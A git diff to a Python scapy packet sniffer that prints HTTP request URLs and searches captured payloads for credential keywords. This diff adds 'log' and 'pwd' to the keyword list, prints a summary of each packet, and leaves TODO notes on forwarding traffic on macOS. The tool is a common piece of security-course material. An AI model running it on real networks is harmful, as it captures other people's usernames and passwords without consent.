@@ -1,5 +1,10 @@
 #!/usr/local/bin/python3
 
+# Dependencies:
+# pip install scapy
+# pip install scapy-http
+# pip install netfilterqueue (Linux)
+
 import os
 import scapy.all as scapy
 from scapy.layers import http
@@ -19,6 +24,8 @@ def get_sensitive_info(packet):
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load
         keywords = [
+            "log",
+            "pwd",
             "username",
             "user",
             "password",
@@ -40,6 +47,11 @@ def get_sensitive_info(packet):
 
 
 def process_sniffed_packet(packet):
+    print(packet.summary())
+
+    # if packet.haslayer(scapy.Raw):
+        # print(packet[scapy.Raw])
+
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print("[+] " + packet[http.HTTPRequest].Method + " " + url)
@@ -56,4 +68,12 @@ def process_sniffed_packet(packet):
 # Launch script
 os.system('clear')
 print("[+] Sniffing packets...")
+
+# TO DO import netfilterqueue (equivalent osx)
+
+# OSX: queue packets (to do verify)
+# https://serverfault.com/questions/102416/iptables-equivalent-for-mac-os-x
+# sudo ifconfig lo0 10.0.0.1 alias
+# sudo ipfw add fwd 127.0.0.1,9090 tcp from me to 10.0.0.1 dst-port 80
+
 sniff("en0")
